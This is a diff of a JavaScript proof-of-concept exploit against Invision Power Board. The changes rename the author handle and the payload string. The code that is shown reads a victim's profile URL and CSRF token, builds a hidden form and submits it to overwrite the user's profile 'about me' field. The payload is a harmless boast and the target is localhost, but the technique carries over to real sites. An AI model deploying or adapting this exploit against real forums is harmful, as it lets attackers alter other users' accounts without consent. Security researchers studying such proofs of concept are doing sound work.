@@ -1,18 +1,18 @@
 /*
-www.sxcurity.pro/pocs/lol.js
+www.corben.io/pocs/lol.js
  _
 (_)_ ____      ___ __
 | | '_ \ \ /\ / / '_ \
 | | |_) \ V  V /| | | |
 |_| .__/ \_/\_/ |_| |_|
  |_|  IPB Exploit
-      by @sxcurity
+      by @hacker_
 
 index.php?/profile/<user>/&tab=field_core_pfield_1
-This will add "sxcurity is my hero" to the user's about me.
+This will add "corben is my hero" to the user's about me.
 */
 var target = 'http://localhost/ips_4141/index.php';
-var payload = 'sxcurity is my hero';
+var payload = 'corben is my hero';
 
 // Gets the Profile URL of the victim.
 var cdl = get(target);
@@ -111,14 +111,14 @@ document.body.innerHTML
 + '<input type="hidden" name="form_submitted" value="1">'
 + '<input type="hidden" name="csrfKey" value="' + token + '">'
 + '<input type="hidden" name="MAX_FILE_SIZE" value="2097152">'
-+ '<input type="hidden" name="plupload" value="sxcurity">'
++ '<input type="hidden" name="plupload" value="corben">'
 + '<input type="hidden" name="bday[month]" value="0">'
 + '<input type="hidden" name="bday[day]" value="0">'
 + '<input type="hidden" name="bday[year]" value="0">'
 + '<input type="hidden" name="enable_status_updates" value="0">'
 + '<input type="hidden" name="enable_status_updates_checkbox" value="1">'
 + '<input type="hidden" name="core_pfield_1" value="' + payload + '">'
-+ '<input type="hidden" name="core_pfield_1_upload" value="sxcurity">'
++ '<input type="hidden" name="core_pfield_1_upload" value="corben">'
 + '</form>';
 
 // submits our csrf form!
